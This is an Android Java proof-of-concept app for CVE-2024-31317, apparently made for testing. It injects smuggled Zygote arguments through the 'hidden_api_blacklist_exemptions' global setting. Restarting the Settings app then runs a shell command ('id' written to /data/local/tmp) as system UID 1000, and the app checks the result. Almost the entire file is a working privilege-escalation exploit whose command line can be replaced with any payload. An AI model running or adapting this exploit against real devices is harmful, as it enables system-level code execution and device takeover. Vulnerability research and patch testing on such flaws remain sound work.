package com.example.tzpoc;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;
import android.widget.TextView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends Activity {
    private static final String TAG = "ZygoteInjection";
    private static final String SETTING_KEY = "hidden_api_blacklist_exemptions";
    private static final String TARGET_PACKAGE = "com.android.settings";

    private TextView tvStatus;
    private StringBuilder logBuilder = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);

        appendLog("=== CVE-2024-31317 Zygote Injection PoC ===");
        appendLog("Target: " + TARGET_PACKAGE);

        // 1. WRITE_SECURE_SETTINGS 権限の確認
        checkPermission();

        // 2. ペイロードの注入
        boolean injected = injectPayload();
        if (injected) {
            appendLog("[+] Payload injected successfully.");
            // 3. トリガー（Settingsアプリの再起動）
            triggerExploit();
        } else {
            appendLog("[-] Payload injection failed.");
        }

        // 4. 結果確認
        checkResult();

        // ログを保存
        saveLog();
    }

    private void checkPermission() {
        try {
            String test = Settings.Global.getString(getContentResolver(), SETTING_KEY);
            appendLog("[+] WRITE_SECURE_SETTINGS is available (read test passed)");
        } catch (SecurityException e) {
            appendLog("[-] WRITE_SECURE_SETTINGS NOT granted: " + e.getMessage());
            appendLog("[!] Please run: adb shell pm grant " + getPackageName() +
                    " android.permission.WRITE_SECURE_SETTINGS");
        }
    }

    private boolean injectPayload() {
        try {
            // 現在の値を保存（デバッグ用）
            String current = Settings.Global.getString(getContentResolver(), SETTING_KEY);
            appendLog("[+] Current value: " + (current != null ? current.replace("\n", "\\n") : "null"));

            // ---- ペイロード構築 ----
            // id コマンドを実行し、結果を /data/local/tmp/zygote_result.txt に出力
            String command = "id > /data/local/tmp/zygote_result.txt";
            String payload = "L*\n" +
                    "--runtime-args\n" +
                    "--setuid=1000\n" +
                    "--setgid=1000\n" +
                    "--invoke-with\n" +
                    "/system/bin/sh -c '" + command + "'\n" +
                    "--package-name=" + TARGET_PACKAGE + "\n" +
                    "android.app.ActivityThread";

            appendLog("[+] Payload: " + payload.replace("\n", "\\n"));

            // 書き込み実行
            boolean result = Settings.Global.putString(getContentResolver(), SETTING_KEY, payload);
            appendLog("[+] Settings.Global.putString result: " + result);

            // 検証
            String verify = Settings.Global.getString(getContentResolver(), SETTING_KEY);
            appendLog("[+] Verified: " + (verify != null ? verify.replace("\n", "\\n") : "null"));

            return result;
        } catch (Exception e) {
            appendLog("[-] Injection failed: " + e.getMessage());
            return false;
        }
    }

    private void triggerExploit() {
        appendLog("[*] Triggering exploit by restarting " + TARGET_PACKAGE + "...");

        try {
            // 1. 強制停止
            java.lang.Process process = Runtime.getRuntime().exec(
                    new String[]{"sh", "-c", "am force-stop " + TARGET_PACKAGE});
            int exitCode = process.waitFor();
            appendLog("[+] force-stop exit code: " + exitCode);
        } catch (Exception e) {
            appendLog("[-] force-stop failed: " + e.getMessage());
        }

        try {
            Thread.sleep(1000);
        } catch (InterruptedException ignored) {}

        try {
            // 2. 再起動（Zygote が新しいプロセスを孵化）
            java.lang.Process process = Runtime.getRuntime().exec(
                    new String[]{"sh", "-c", "am start -n " + TARGET_PACKAGE + "/.Settings"});
            int exitCode = process.waitFor();
            appendLog("[+] start " + TARGET_PACKAGE + " exit code: " + exitCode);
        } catch (Exception e) {
            appendLog("[-] start failed: " + e.getMessage());
        }
    }

    private void checkResult() {
        appendLog("[*] Checking /data/local/tmp/zygote_result.txt ...");

        try {
            Thread.sleep(3000);
        } catch (InterruptedException ignored) {}

        try {
            java.lang.Process process = Runtime.getRuntime().exec(
                    new String[]{"sh", "-c", "cat /data/local/tmp/zygote_result.txt 2>/dev/null || echo 'File not found'"});
            java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();

            String content = output.toString().trim();
            appendLog("[+] Result:\n" + content);

            if (content.contains("uid=1000")) {
                appendLog("[!!!] SUCCESS: Command executed with SYSTEM UID (1000) !!!");
                tvStatus.setText("✅ SUCCESS: uid=1000");
            } else if (content.contains("File not found")) {
                appendLog("[-] Result file not found. Exploit may have failed.");
                tvStatus.setText("❌ Failed: No result file");
            } else {
                appendLog("[!] Unexpected result: " + content);
                tvStatus.setText("⚠️ Partial: " + content);
            }
        } catch (Exception e) {
            appendLog("[-] Failed to read result: " + e.getMessage());
        }
    }

    private void appendLog(String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        Log.d(TAG, msg);

        runOnUiThread(() -> {
            TextView tvLog = findViewById(R.id.tv_log);
            tvLog.append(line);
        });
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (!dir.exists() && !dir.mkdirs()) return;
            File file = new File(dir, "zygote_injection_log.txt");
            try (PrintWriter pw = new PrintWriter(new FileOutputStream(file))) {
                pw.print(logBuilder.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Save log failed: " + e.getMessage());
        }
    }
}
